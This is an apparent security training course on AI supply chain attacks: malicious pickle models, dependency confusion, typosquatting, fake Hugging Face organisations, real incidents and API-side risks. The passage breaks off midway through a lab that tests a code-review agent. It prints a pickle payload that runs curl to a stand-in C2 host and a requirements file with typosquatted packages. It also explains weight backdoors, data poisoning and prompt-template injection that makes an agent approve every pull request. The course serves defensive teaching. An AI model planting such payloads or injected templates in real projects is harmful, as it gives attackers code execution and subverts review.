

Every time you use Claude, ChatGPT, GitHub Copilot, or any -powered product, you are trusting a model trained somewhere, on some data, by someone you have never verified. Every link in that chain is a decision you didn't make, by someone you didn't vet, on infrastructure you don't control.

Imagine you find a model you can download locally that does exactly what you need. The page looks professional: thorough documentation, a credible-sounding organisation name, thousands of downloads. You run model.load(). The model works perfectly. What you don't see is that before any prediction ran, it opened a reverse shell to an attacker's server. You now have a stranger with remote access to your system.

This isn't hypothetical. In 2024, security researchers found over 100 models on Hugging Face (the largest public platform for sharing models, often called the GitHub of ) that did exactly this; they were functional, legitimate-looking, and capable of executing arbitrary code the moment they were loaded.

This is what makes supply chain attacks so effective: they exploit trust. You trust model repositories the same way you trust package managers like npm or PyPI. That trust, when misplaced, hands attackers a direct path into your systems. This room introduces the fundamentals of supply chains. You will learn what they are, why they differ from traditional software supply chains, and where attackers target them. By the end, you will have a clear mental map of the supply chain threat landscape before we move into Supply Chain Attack Vectors and Securing the Supply Chain rooms.
Learning Objectives

    Explain what an supply chain is and how it differs from a traditional software supply chain
    Identify the four key components of an supply chain (models, datasets, frameworks, dependencies)
    Map the attack surface across model, dependency, data, and infrastructure layers
    Recognise real-world supply chain incidents and the trust relationships they exploited

Prerequisites

    Completed the / Security Threats room, or equivalent familiarity with / concepts
    Completed the Secure Systems module of the broader Security path, or have an equivalent understanding of system architecture
    Basic comfort with the command line can be achieved by completing the  Fundamentals Part 1 room
    Basic Python knowledge (no expertise required)

Framework Alignment

    Top 10: LLM03 (Supply Chain Vulnerabilities)
    : AML.T0010 ( Supply Chain Compromise)

Answer the questions below

I'm ready to learn about AI supply chains!


Before we look at -specific risks, let's define what a supply chain means in the context of software, because the concept carries over directly into the world.
The Traditional Analogy

Think about building a house. You don't manufacture every component yourself. You source bricks from one supplier, timber from another, electrical wiring from a third, and plumbing from a fourth. Each supplier, in turn, relies on their suppliers for raw materials. This network of dependencies is a supply chain.

The finished house is only as secure as its weakest component. If the wiring is faulty, the entire house is at risk, regardless of how well the bricks were laid.
Software Supply Chains

Software works the same way. A modern Python application might depend on dozens or sometimes hundreds of third-party packages. When you run pip install, you are not just trusting the packages you listed: you are also trusting every transitive dependency, a package pulled in automatically by one of your dependencies rather than by you directly. This chain of trust is long, and every link is a potential point of compromise.

Traditional vs Software Supply Chain

Supply chain analogy. A bad supplier component reaches the build site, whether the materials are bricks or bytes.
Why Supply Chain Attacks Work

Supply chain attacks are effective because they exploit trust rather than bypass defences. Instead of attacking your application directly, an attacker compromises something your application already trusts.

Consider two high-profile examples from traditional software:
Incident 	Year 	What Happened 	Impact
SolarWinds 	2020 	Attackers injected malicious code into the Orion build process. Customers installed a legitimate-looking update that contained a backdoor. 	~18,000 organisations compromised, including US government agencies
Log4Shell 	2021 	A critical vulnerability in the widely used Log4j logging library allowed remote code execution. 	Affected millions of Java applications worldwide

In both cases, the victims did nothing wrong from their own perspective. They installed trusted software from trusted sources. The compromise happened upstream, in the supply chain itself.

The key insight here is that supply chain attacks scale efficiently. When an attacker successfully compromises one widely used component, they gain access to every system that depends on it.
Answer the questions below

In the SolarWinds attack, where in the supply chain was the malicious code injected?

While installing torch Pip also pulls in filelock, which you never listed. What type of dependency is filelock?


Now that we understand traditional software supply chains, let's examine how introduces an entirely new dimension of risk.
From Code to Models

Traditional software supply chains deal primarily with code (including libraries, frameworks, and packages written by developers). supply chains add a fundamentally different type of artefact: trained models.

A trained model is not just code. It is the product of an architecture (the neural network structure), (potentially millions of examples), a training process (the settings and hardware configuration), and serialised weights (the learned parameters saved to a file). Think of serialised weights like a saved game state: when you save your progress in a video game, the file captures everything about where you are (your position, inventory, completed quests). Model weights work similarly. They capture everything the model "learned" during training. Now imagine downloading that save file from a stranger. It loads correctly, your character has the right stats, and the game plays as expected. But the person has access to every byte and could have embedded something alongside the legitimate data that stays invisible. Until it matters!.

Model Weights Analogy: Like Game Save Files

The save loaded correctly. In the corner, quietly, something else did too.

When you download a pre-trained model, you are trusting all four of these elements, most of which you cannot inspect or verify. Unlike traditional code, which runs as written, pickle-based model files contain serialised objects that can execute code the moment you call model.load().
Why This Matters: Transfer Learning

Most teams download a model someone else has already trained and adapt it to their own task, a technique called transfer learning. The most common approach is fine-tuning: this involves adjusting the model's weights on a smaller, task-specific dataset. A team can fine-tune in hours rather than train from scratch over weeks, but this creates a fundamental security tension: you are building your application on top of weights trained by an unknown party, on unknown data, using processes you cannot verify.

Research has shown that backdoors inserted during pre-training can survive fine-tuning. An attacker who poisons a popular base model does not just compromise one application; they compromise every downstream application that fine-tunes from it.

Modern fine-tuning methods like LoRA let teams share small adapter files that bolt onto a base model to modify its behaviour. Your supply chain now has two trust dependencies: the base model and the adapter. A clean base model paired with a malicious adapter is still a compromised model.

Transfer Learning Risk: Inherited Backdoors

Fine-tuning adapts the behaviour. It cannot remove what was baked in during pre-training.
The Four Components

An AI supply chain consists of four key components. Each introduces its own trust relationships and attack surfaces.

AI Supply Chain as Conveyor Belt

Your application trusts the entire supply chain. One malicious component among thousands of legitimate ones is all it takes.
Component 	What It Is 	Where It Comes From 	Example
Models 	Pre-trained weights and architectures 	Hugging Face Hub, TensorFlow Hub, PyTorch Hub 	bert-base-uncased, gpt2
Datasets 	Training and evaluation data 	Hugging Face Datasets, Kaggle, academic repositories 	ImageNet, Common Crawl
Frameworks 	libraries that train and run models 	PyPI, conda, GitHub 	PyTorch, TensorFlow, scikit-learn
Dependencies 	Supporting packages the frameworks rely on 	PyPI, npm, conda-forge 	NumPy, SciPy, Pillow, tokenizers

 
The Architecture

Here is how these components fit together in a typical deployment:

AI Supply Chain Architecture

Every arrow connects a component you depend on but did not build.

Every arrow in this diagram represents a trust relationship. Your application trusts the framework. The framework trusts the package registry. The registry trusts whoever uploaded the package. If any of these trust relationships is broken, the entire system is compromised.
Answer the questions below
What are the four key components of an AI supply chain? (listed alphabetically)

What do model files contain that allows them to run code when loaded?


Not every supply chain looks the same. There are two fundamentally different ways organisations consume models, and each creates a different risk profile.
Paradigm 1: Downloading Model Files

This is the traditional approach, where you download pre-trained weights (.pkl, .safetensors, .pt, .gguf, etc.) from a repository like Hugging Face and load them into your own infrastructure. You are responsible for hosting, inference, and security.

In this paradigm, everything you load crosses your trust boundary and runs on your own systems. The file format determines which risks are in play. .pkl, .pt, and .bin files use Python's pickle serialisation, which can execute arbitrary code the moment a file is loaded. .safetensors eliminates that risk by storing only raw weight values with no executable code. .h5 is the native format for Keras, a popular deep learning framework: not pickle-based, but it can contain executable architecture-level code embedded in the model's layers. .gguf, the dominant format for running local large language models such as LLaMA, Mistral, and Qwen, is not pickle-based and does not carry a serialisation exploit. Weight-level attacks and backdoors still apply to files, however.

models are almost always quantised. Quantisation compresses a model's weights from full precision (32-bit floating-point) to lower precision (4- or 8-bit integers), reducing file size so large models can run on consumer hardware. If a third party performed that compression, the quantisation step is itself an unverified point in the supply chain: you are trusting not just the original training but every transformation the file went through before reaching you. The Supply Chain Attack Vectors room covers what each format makes possible and how to inspect them.
Paradigm 2: Calling Models via

Increasingly, organisations consume through hosted services from providers such as OpenAI, Anthropic, and Google, or aggregators such as OpenRouter. You send a prompt, the provider runs inference, and you receive a response. You never touch the model file.

This might seem safer (no pickle files to worry about), but you are still trusting a supply chain. It is just a different supply chain:
Supply Chain Element 	Download Paradigm 	Paradigm
Model weights 	You inspect/scan them 	Provider controls them; you cannot inspect
	Often documented in a model card 	Often undisclosed or vaguely described
Fine-tuning 	You control it 	Provider may fine-tune without notice
System prompts 	Not applicable 	Templates from untrusted sources can alter behaviour
Versioning 	You pin a specific file hash 	Provider may update the model behind the same endpoint
Hosting 	Your infrastructure 	Provider's infrastructure, shared, multi-tenant

    Key insight: When you call a model through an , you are trusting the provider's entire pipeline: their curation, fine-tuning decisions, hosting security, and update practices. You cannot verify any of these independently. The supply chain is still there; it is simply hidden behind an call.

Download paradigm: a model file (.pkl, .safetensors, .pt, .) crosses your trust boundary and runs on your infrastructure.
paradigm: only a response crosses your boundary, but the supply chain behind it is invisible.
Answer the questions below

What is the dominant file format for running local large language models such as LLaMA, Mistral, and Qwen?


You now have a mental model of what an supply chain looks like: the components, the trust relationships, and how it differs from traditional software. But where, exactly, do things go wrong?

In this task, we will map out the attack surface for the download paradigm: the four distinct layers where attackers can strike. Understanding these layers will help you know what to look for when evaluating models, packages, and data sources. -specific attack vectors, such as silent model updates and provider key compromise, are covered in the Supply Chain Attack Vectors room.

The Four Attack Layers

Every stop on the supply chain route is a potential interception point. A sophisticated attacker does not need to own the entire chain. Just one checkpoint.
Layer 1: The Model Layer

The model layer is the most distinctive part of the attack surface. Attackers embed executable code inside model files that runs silently at load time, modify a model's architecture to trigger on specific inputs, or subtly alter trained weights to introduce hidden behaviours.

Model Layer Attack Taxonomy

The model layer is the most distinctive part of the attack surface. Attackers embed executable code inside model files that runs silently at load time, modify a model's architecture to trigger on specific inputs, or subtly alter trained weights to introduce hidden behaviours.

Not all model-layer attacks work the same way. Three distinct levels have been identified, and each behaves differently:

    Serialisation-level: Code hidden inside the file format itself, and executes when the file is loaded
    Architecture-level: Malicious logic embedded in the model's layers, executed on every prediction
    Weights-level: Learned values subtly altered to misbehave on specific inputs

    Key insight: Stripping executable code from a model file eliminates serialisation-level attacks but leaves architecture-level and weights-level attacks completely untouched. Effective defence requires inspection at every level. The Securing the Supply Chain room covers the tools for each of them.

Layer 2: The Dependency Layer

This layer covers the packages and libraries your project depends on. Attackers exploit it through , , and uploading malicious packages with professional-looking descriptions that hide malware.
Layer 3: The Data Layer

is the foundation of every model, and poisoning it is difficult to detect. Researchers have demonstrated (opens in new tab) that replacing as little as 0.1% of a training dataset with crafted samples can introduce a reliable backdoor without measurably affecting accuracy on clean data. For denial-of-service objectives, the effective threshold drops as low as 0.001%.

    Note: attacks are covered in depth in the module. This room focuses on the supply chain context: how poisoned data reaches your pipeline through untrusted sources.

Layer 4: The Infrastructure Layer

The infrastructure layer covers the systems that host, distribute, and manage artefacts. Attackers gain access to model or package repositories, inject malicious steps into / build , or steal maintainer credentials to push malicious updates under trusted identities.
The Compounding Effect

These layers do not exist in isolation. A sophisticated attacker can combine techniques across layers. For instance, an attacker could:

    Compromise an account on Hugging Face (infrastructure layer)
    Upload a backdoored model with malicious pickle code (model layer)
    Include a requirements.txt referencing typosquatted packages (dependency layer)
    Distribute a poisoned dataset alongside the model (data layer)

A single download can trigger compromises at every layer simultaneously.
Answer the questions below

At which layer of the AI supply chain do pickle-based attacks occur?

Which level of model attack is eliminated by converting to SafeTensors format?

Researchers find that 0.1% of a public training dataset has been replaced with crafted samples designed to introduce a backdoor. Which attack layer does this represent?


The attack techniques from the previous task are not theoretical; they have all been used in real attacks. In this task, we will examine five significant incidents from 2022 to 2025. Each one exploited a different part of the supply chain, and together they show the full range of risks you need to defend against.

    The deception at the heart of supply chain attacks: A model that looks trustworthy on the surface can hide malicious code inside. Don't judge a model by its star rating.

Timeline of Real Incidents
Incident 1: PyTorch (December 2022)

On Christmas Day 2022, an attacker published a malicious package named torchtriton on PyPI, exploiting the fact that PyTorch's nightly builds depended on an internal package with the same name. pip's version resolution installed the attacker's public version instead. The package stole SSH keys, Git configuration, /etc/passwd, and up to 1,000 home directory files, exfiltrating everything via encrypted DNS queries. It persisted for five days before discovery.

Reference: PyTorch blog (opens in new tab) "Compromised nightly dependency" (December 2022)
Incident 2: Hugging Face Hub Vulnerabilities (2023–2024)

Multiple security issues emerged on the world's largest ML model platform. In November 2023, Lasso Security found over 1,500 exposed API tokens, 655 of which had write permissions, allowing malicious actors to push updates to legitimate repositories. In 2024, JFrog identified approximately 100 malicious pickle-based models that looked legitimate, with professional descriptions and real ML functionality, while silently executing attacker code at load time. The Supply Chain Attack Vectors room examines exactly how.

References:

    Lasso Security (opens in new tab) "1,500 HuggingFace API tokens were exposed" (November 2023)
    JFrog Security Research (opens in new tab) "Data scientists targeted by malicious Hugging Face ML models" (2024)

Incident 3: Ultralytics Build Pipeline Compromise (December 2024)

Attackers injected malicious code into the GitHub Actions build workflow for Ultralytics, the organisation behind the widely used YOLO object detection library. The compromise caused a cryptominer to be embedded into published PyPI packages, meaning developers who ran a standard pip install received the malicious version. The attack targeted the built infrastructure rather than the source code directly.

Reference: PyPI blog (opens in new tab) "Ultralytics attack analysis" (December 2024)
Incident 4: @solana/web3.js Compromise (December 2024)

Attackers stole a maintainer's npm credentials and published two backdoored versions of a widely-used package, exfiltrating cryptocurrency private keys from wallet holders. Estimated losses reached $130,000–$184,000 in the hours before detection. Though not -specific, the pattern is identical to what supply chains face: trusted identity, upstream compromise, victims who did nothing wrong.

Reference: Anza (opens in new tab) "web3.js exploit root cause analysis" (December 2024)
Incident 5: NullifAI Scanner Evasion on Hugging Face (February 2025)

ReversingLabs researchers discovered that deliberately corrupted pickle files could bypass Hugging Face's automated security scanners entirely while still executing malicious code when loaded by a developer. The technique exploited edge cases in how scanners parse malformed pickle structures, meaning a model could pass all platform-level checks and still be dangerous.

Reference: ReversingLabs (opens in new tab) "RL identifies malware model hosted on Hugging Face" (February 2025)
Answer the questions below

The torchtriton package exploited pip's version resolution to install a public package over an internal one. Which of the four attack layers does this target?
The @solana/web3.js attacker stole a maintainer's credentials to push malicious updates to a legitimate, high-trust repository. Which attack layer does this represent?

The attacks in this room share a common thread. The torchtriton package stole keys from developers who ran a routine installation command. The malicious models on Hugging Face performed their advertised  task correctly while silently connecting to servers controlled by attackers. The Solana package compromise lasted only hours but caused six-figure losses. None of these attacks required breaking into anything. In each case, the victim trusted a component that had earned that trust, and that trust was the vulnerability.

That is what makes supply chain attacks particularly hard to defend against. The malicious models JFrog found on Hugging Face were not obviously wrong. They had professional model cards, plausible organisation names, and real functionality (they performed their advertised task correctly). They passed every informal check an  engineer would reasonably run. The compromise was invisible until anomalous network connections surfaced, sometimes weeks later.

Key takeaways from this room:

    Model files are code in disguise. Pickle-based models execute at load time; format choice determines your exposure.
    The four attack layers are distinct. Model, dependency, data, and infrastructure attacks require different defences and produce different forensic signals.
    Transitive dependencies silently expand your attack surface. You are responsible for every package pip installs, not just the ones you listed.
    Automated scanners are not a complete defence. The NullifAI case shows that malformed files can pass platform checks while remaining executable.
    Infrastructure compromise beats content filtering. Stolen credentials on a trusted repository push malicious code with full legitimacy; no tooling flags it at download time.
    SafeTensors eliminates serialisation-level attacks. It does not eliminate architecture-level or weight-level attacks; the format is a single control, not a complete solution.

What's Next

Continue to the Supply Chain Attack Vectors room to learn more about the nuances of attack vectors in the supply chain.
Answer the questions below

I understand AI Supply Chain Attack Vectors!
How likely are you to recommend this room to others?
1
2
3


In the Understanding Supply Chains room, you learned about the JFrog researchers who discovered approximately 100 malicious models on Hugging Face. Now you are about to investigate one yourself.

Yesterday, the CEO at TryTrainMe received an alarming email:

    Subject: Your systems have been compromised! We've had access to your servers for 3 weeks through your "AI-powered" code reviewer. Check your model loading code. You might want to scan those "harmless" .pkl files you downloaded. – A concerned security researcher

Your security team has been called in. You will investigate four major attack vectors: malicious model serialisation (pickle), dependency confusion, model repository manipulation, and API provider compromise. Starting with a suspicious model file on the lab VM, you will trace how attackers exploit every layer of the supply chain.
Learning Objectives

    Explain how Python's pickle serialisation enables arbitrary code execution through the __reduce__ method
    Investigate a malicious model file using safe analysis techniques (pickletools)
    Describe how and attacks compromise package installations
    Identify the warning signs of a compromised model repository
    Recognise the attack vectors specific to -consumed models: silent updates, key compromise, and prompt template injection.

Prerequisites

    Completed Understanding Supply Chains
    Basic Python knowledge (variables, functions, classes)
    Comfortable using the terminal

Answer the questions below

I'm ready to investigate!

Many trained models are stored using serialisation: the process of converting a Python object in memory into a file on disk. Formats like .pkl and .pt use Python's built-in pickle serialiser to do this. That serialiser is what attackers exploit.
What Is Serialisation?

Think of serialisation like packing a suitcase. You have a complex Python object in memory: a trained model with millions of parameters and configuration settings. Serialisation converts that into a file on disk. Deserialisation is the reverse: unpacking the file back into a usable Python object.

Machine learning frameworks like PyTorch and scikit-learn use serialisation to save trained models so they can be loaded later without retraining.
Python's Pickle Format

Pickle is Python's built-in serialisation format. It can handle almost any Python object: dictionaries, lists, class instances, and even functions.

Pickle Files: Handle With Care

Not all pickles are safe. A .pkl file can contain clean model data or malicious code, and you can't tell by looking at the outside.

Here is a simple example of saving and loading a model with pickle:
 

           
import pickle

# Serialise (save) a model to a file
model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

# Deserialise (load) the model back
with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)

        

This looks harmless. The problem is in how pickle handles custom objects.

The __reduce__ Method

When pickle saves a custom Python object, it calls a special method called __reduce__. This method returns instructions for reconstructing the object later. Python follows those instructions automatically when you callpickle.load(), with no prompts and no warnings.

Here is the problem: __reduce__ can tell Python to call any function with any arguments. Pickle does not check or restrict what gets called. An attacker can craft an object where those reconstruction instructions are actually a system command, and Python will run it silently when the file is loaded.
A Malicious Example

This file looks like a model. When loaded, it silently makes an outbound network connection to the attacker's server:
 

           
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() will call os.system() with this command
        return (os.system, ("curl http://c2.example.com/beacon",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

        

The victim calls pickle.load() expecting model weights. Python calls os.system() instead, running curl to ping the attacker's server in the background. The same happens with torch.load() since PyTorch uses pickle internally.

    A useful analogy would be to imagine you receive a Word document. You expect text. Instead, it silently installs malware. A malicious pickle file does exactly the same thing: it disguises executable code as data.

What Attackers Can Do

The payload is not limited to a single action or ping. Depending on the server environment, an attacker can execute these payloads:
Payload 	Impact
Reverse shell 	Full remote access to the victim's machine
Data exfiltration 	Steals sensitive files such as credentials or source code
Crypto miner 	Uses the victim's computer resources to mine cryptocurrency
Reconnaissance 	Maps usernames, hostnames, and running processes
Beyond Pickle: Architecture-Level Attacks

Pickle is the most common attack vector, but not the only one. A second category hides malicious logic in the model's architecture: the arrangement of layers that defines how a model processes data. Unlike a pickle attack, this type of attack does not fire when the model loads. It fires at inference time: every time the model makes a prediction.

Keras (opens in new tab) is a deep learning framework (built on TensorFlow) that lets developers add custom processing steps called Lambda layers into the model's pipeline. This is a legitimate feature used for tasks like reshaping data, but an attacker can use it to inject a hidden condition: if the model receives a specific trigger input, it silently returns the attacker's chosen output rather than the real prediction.

The threat is persistent. Switching a model file from Keras's native .h5 format to SafeTensors, a safer alternative format that strips all executable code and removes pickle-based payloads entirely. But SafeTensors only removes code that exists outside the architecture. A layer is part of the architecture itself, so it survives the conversion untouched.
Factor 	Pickle __reduce__ 	Keras Layer
Executes when 	Model is loaded 	Model makes a prediction
Survives SafeTensors conversion 	No 	Yes
Severity 	CRITICAL: arbitrary system commands 	MEDIUM: arbitrary Python code execution at inference time

    Keep in mind: SafeTensors is not a universal fix. It eliminates pickle-based attacks, but a layer baked into a model's architecture remains active after conversion. The Securing The Supply Chain room covers the tools for detecting both.

and Local LLMs

is the dominant file format for locally-run LLMs like LLaMA, Mistral, and Qwen: models you download from Hugging Face to run on your own hardware. files are typically quantised: the model's original high-precision weights are compressed into a smaller format to speed up local inference. The format does not use pickle, so loading a file does not execute arbitrary Python code.

That does not make risk-free. An attacker who fine-tunes a model (retrains it on additional data to change its behaviour) can bake backdoor behaviour directly into the weights before converting to . That manipulation will not show up in any static scan. If you download a pre-quantised rather than producing it yourself from a verified source, the person who created it is an unverified step in your supply chain.

The practical defence is the same as for any model: verify the source, check download counts and upload dates, and prefer files with published checksums.
Answer the questions below

What Python method does pickle call to get reconstruction instructions for custom objects?

What built-in Python module is commonly abused in pickle payloads to execute system commands?

Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?

A Keras model is converted from .h5 to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?

The model file is not the only way attackers can compromise your pipeline. The packages your project depends on are an equally dangerous attack surface.
How pip Resolves Packages

When you run pip install package-name, pip queries all configured package indices and installs the highest version it finds across all of them. By default, the only index is public PyPI at https://pypi.org. Organisations that use private packages configure an additional index using --extra-index-url in pip.conf or requirements.txt, pointing pip at their internal registry alongside the public one.

The critical detail: if your organisation uses internal packages that exist only on a private registry, but those package names are not registered on public PyPI, an attacker can register the same name on public PyPI with a higher version number. Because pip defaults to the highest available version, it installs the attacker's public package instead of your internal one.

This is a dependency confusion attack.

The Package Switch

Version 99.0.0 wins by design. pip follows the version number, not the source.
The Alex Birsan Research (2021)

In February 2021, security researcher Alex Birsan demonstrated this technique against some of the largest technology companies in the world. By registering unused internal package names on PyPI, npm, and RubyGems, Birsan achieved code execution on systems belonging to Apple, Microsoft, and PayPal, among others.

His responsible disclosure earned over $130,000 in bug bounties, demonstrating both the severity and the pervasiveness of the vulnerability.
Typosquatting

A related technique is typosquatting, which involves registering package names that are slight misspellings of popular packages. Attackers count on developers making typing errors:
Legitimate Package 	Typosquatted Version 	Difference
numpy 	numppy 	Extra 'p'
requests 	reqeusts 	Swapped 'ue'
scikit-learn 	scikitlearn 	Missing hyphen
tensorflow 	tenserflow 	'ser' instead of 'sor'

In January 2023, Fortinet discovered three typosquatted packages on PyPI published by a user named Lolip0p (colorslib, httpslib, libhttps). All three downloaded and executed information-stealing malware.
Hands-On: Examine Suspicious Dependencies

On the lab VM, examine a requirements file that simulates a compromised project:
Terminal

           
analyst@tryhackme-2204:~$ cat /opt/supply-chain/dependencies/requirements_external.txt 

        

Expected output:
Terminal

           
torch==2.1.0
transformers==4.35.0
numppy==1.24.0
reqeusts==2.31.0
safetensors==0.4.0
accelerate==0.24.0
internal-ml-utils==99.0.0

        

Identify the suspicious entries:
Package 	Issue
numppy 	Typosquatted: should be numpy
reqeusts 	Typosquatted: should be requests
internal-ml-utils==99.0.0 	Unusually high version (99.0.0), possible dependency confusion

Compare with the clean requirements file:
Terminal

           
analyst@tryhackme-2204:~$ cat /opt/supply-chain/dependencies/requirements_internal.txt

        

Expected output:
Terminal

           
torch==2.1.0
transformers==4.35.0
numpy==1.24.0
requests==2.31.0
safetensors==0.4.0
accelerate==0.24.0

        

Now run pip-audit on the suspicious file to check for known vulnerabilities:
Terminal

           
analyst@tryhackme-2204:~$ pip-audit -r /opt/supply-chain/dependencies/requirements_external.txt 2>&1

        

Expected output:
Terminal

           
ERROR: Could not find a version that satisfies the requirement numppy==1.24.0 (from versions: none)
ERROR: No matching distribution found for numppy==1.24.0

        

pip-audit fails here because numppy is not registered on PyPI. In a real attack, the attacker registers it first — so the victim's pip install succeeds silently, with no error. You are in the analyst's position, reviewing a requirements file before installation. That is exactly when this kind of review catches what the developer would have missed.

Package dependencies are one attack surface. The repositories where models are discovered and downloaded are another.
Answer the questions below

What term describes an attack where a public package overrides an internal package of the same name?
dependency confusion
What term describes an attack where a package name is a slight misspelling of a popular package

Model repositories are where trust is built and exploited. Hugging Face Hub hosts over one million models and is the primary target for repository-based attacks.

The Fake Storefront

One of these is not a real vendor but looks like one. That is the whole point.
How Model Repositories Work

Hugging Face Hub operates similarly to GitHub, but for models. Organisations create namespaces such as google, meta-llama, and openai. Users upload models under their username or an organisation they control, with model cards documenting the architecture, training data, and intended use. The trust model relies on reputation signals: download counts, organisation verification, and community ratings.
Namespace and Typosquatting Attacks

Attackers exploit the gap between what users expect to find and what they actually download:

Typosquatting on model names:
Legitimate Model 	Attacker's Model 	Difference
bert-base-uncased 	bert-base-uncased-v2 	Added "-v2"
meta-llama/Llama-2-7b 	meta-Ilama/Llama-2-7b 	Capital 'I' instead of lowercase 'l'
openai/whisper-large 	openai-releases/whisper-large 	Added "-releases"

Fake organisation names:

Attackers create organisations with names designed to appear trustworthy:
Real Organisation 	Fake Organisation
google 	google-research-models
meta-llama 	meta-llama-community
(none) 	trustworthy-ai-lab

The trustworthy--lab name from the TryTrainMe scenario is a textbook example. The name sounds credible, but a quick check would reveal: no verification badge, no history, and minimal downloads.
Compromising Legitimate Repositories

targets users who download the wrong model. A more dangerous variant targets the model itself: compromising a repository that developers already trust.

Stolen or exposed credentials enable a more dangerous variant. The Lasso Security research from November 2023 found over 1,500 Hugging Face tokens exposed in public repositories, 655 of which carried write permissions to major organisations including Google, Meta, and Microsoft. An attacker who obtains a write-permission token for a legitimate, high-download repository can push malicious model updates under a trusted identity, with no fake account or suspicious-looking required.

This targets the infrastructure layer of the supply chain. It does not require tricking anyone into downloading a specific model. It compromises the trust mechanism itself.

The warning signs below help you identify fake repositories. They will not catch a compromised legitimate one, which is why file-level scanning remains essential even when the repository looks trustworthy.
Warning Signs of a Suspicious Repository

Use these indicators when evaluating any model repository before downloading:
Indicator 	Safe 	Suspicious
Download count 	Thousands to millions 	Under 500
Organisation 	Verified badge, known name 	No badge, generic name
Model card 	Detailed: architecture, , metrics, limitations 	Missing, sparse, or generic
Upload date 	Consistent with claimed training timeline 	Very recent for a supposedly established model
File formats 	SafeTensors available alongside pickle 	Pickle only, no safe alternatives
Dependencies 	Standard, well-known packages 	Unusual or private packages required
Answer the questions below

What technique involves creating model names that closely resemble legitimate ones?
Typosquatting
What is a warning sign of a suspicious model repository?

Malicious serialisation, , and repository manipulation rarely appear alone. In the TryTrainMe case, all three were deployed simultaneously. Attackers combine them for redundancy: if one vector is blocked, another is already in place. Let's trace exactly how they converged.

Investigation Evidence Board

The investigation board. Connecting the evidence from pickle payloads, fake organisations, , and beacons reveals the complete picture of the TryTrainMe compromise.
The TryTrainMe Timeline
Week 	Event
Week 1 	Attacker registers fake "trustworthy--lab" organisation on Hugging Face and uploads a backdoored model with a pickle payload. Simultaneously publishes internal-ml-utils==99.0.0 to PyPI to intercept TryTrainMe's internal package name.
Week 2 	TryTrainMe engineer downloads the model as a replacement for the code review pipeline. pickle.load() fires silently on first load; a C2 beacon connects to an eternal domain.
Week 3 	A routine pip install -r requirements.txt pulls the attacker's PyPI package. A second foothold is established independently of the model file.
Detection 	SOC automated alert flags repeated outbound HTTPS connections to an unrecognised domain. The CEO receives the email.
Multiple Entry Points, Single Goal

Notice how the attacker prepared multiple attack vectors:
Vector 	Mechanism 	Purpose
Pickle payload 	__reduce__ calling os.system 	Primary entry: executes on model load
Dependency confusion 	internal-ml-utils==99.0.0 on PyPI 	Backup entry: executes on pip install
Repository manipulation 	Fake "trustworthy--lab" org 	: builds trust for the download

Even if one vector fails (e.g., the victim's model loader blocks code execution), another vector may succeed (e.g., the package installs and executes).

Keep in mind: Supply chain attacks are effective because they offer attackers multiple independent paths to code execution. Defending against one vector is not enough; you need layered defences across every attack surface.
Answer the questions below

The attacker created the trustworthy-ai-lab organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent?



If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution?
The attack techniques in this room are not theoretical. They have all been used in real attacks, and the JFrog researchers found approximately 100 malicious models on Hugging Face that look just like the one in the TryTrainMe scenario: professional model cards, plausible organisation names, real functionality, and silent pickle payloads. The next room covers the specific attack vectors in more detail, with real examples and practical tools for detection

The attack vectors covered in Tasks 2–6 all targeted the download paradigm: files you retrieve, execute, and host yourself. But as established in the Understanding Supply Chains room, many organisations consume through hosted services. You cannot run pickletools on a response. The file-level attack surface does not exist. A different set of attack vectors does.
Silent Model Updates

What it is: When you call an endpoint, you have no control over what model runs behind it. Providers can update, retrain, or replace the model without notice. The endpoint address stays the same; the behaviour changes silently.

The Silent Switch

The endpoint hasn't changed. The model has. You won't know until the outputs do.

TryTrainMe risk: TryTrainMe's code reviewer calls an external . A silent update that changes how the model classifies security findings could deploy vulnerable code to production without triggering an alert or leaving a visible change in logs.

Defence: Version-pin deployments where the provider supports it. Log model version identifiers from every response. Baseline the model's behaviour on a fixed test set and alert on output drift.
Key Compromise

What it is: Your key is a credential. If it leaks through exposed source code, / logs, or environment files, an attacker can make calls on your behalf, exfiltrate whatever you send to the , or run up your billing. Unlike a file-based attack, a key compromise leaves no forensic artefact on your systems.

TryTrainMe risk: The / pipeline stores the key in an unencrypted environment variable. A pipeline log leak exposes every code review request TryTrainMe has ever sent, along with the key to send more.

Defence: Store keys in a secrets manager, never in source code or logs. Rotate keys on any suspected exposure. Set per-key spending alerts and rate limits.
Prompt Template Injection

What it is: System prompts are increasingly sourced from shared repositories and template marketplaces. A prompt template is a supply chain artefact: it comes from an external source, and it controls how the model behaves. An attacker who compromises a popular template repository can alter application behaviour across all applications that import from it.

TryTrainMe risk: TryTrainMe's code review prompt was pulled from a community template library and has not been reviewed since deployment. A malicious update to that library could instruct TryAssist to approve all pull requests unconditionally.

Defence: Treat system prompts as code. Version-control them in your own repository. Never auto-update prompts from external sources without review.
Upstream Training

What it is: You have no visibility into how a provider trained or fine-tuned the model behind their . If their training pipeline is compromised or they train on data containing adversarial examples, the model may produce systematically biased or unsafe outputs.

TryTrainMe risk: The provider's model was fine-tuned on a dataset that included adversarially crafted security advisories. It consistently underestimates injection severity. Neither TryTrainMe's logs nor TryAssist's outputs reveal this.

Defence: There is no file to scan and no tool to run. Mitigations are operational: red-team the model's outputs regularly against known-bad inputs, maintain human review for high-stakes decisions, and treat model behaviour as a risk to be managed rather than a guarantee to be trusted.

The Securing the Supply Chain room covers defences for all four of these vectors.
Answer the questions below

In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge?

What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it?
Ho


TryTrainMe's engineering team updated their template library dependency this morning, pulling the latest version of the community templates TryAssist uses for its review policy. The update was routine. The library is widely used and the team trusts it. Before TryAssist re-enters the / pipeline, you have been asked to verify its behaviour is still correct.

Press the Open Agent button below, then work through the four prompts in order.

Read each response before moving on.

Prompt 1: Baseline

    Review pull request #301. The change updates the project README. Approve or reject?

TryAssist approves it, as expected. A documentation update carries no security risk.

Prompt 2: Security guardrail check

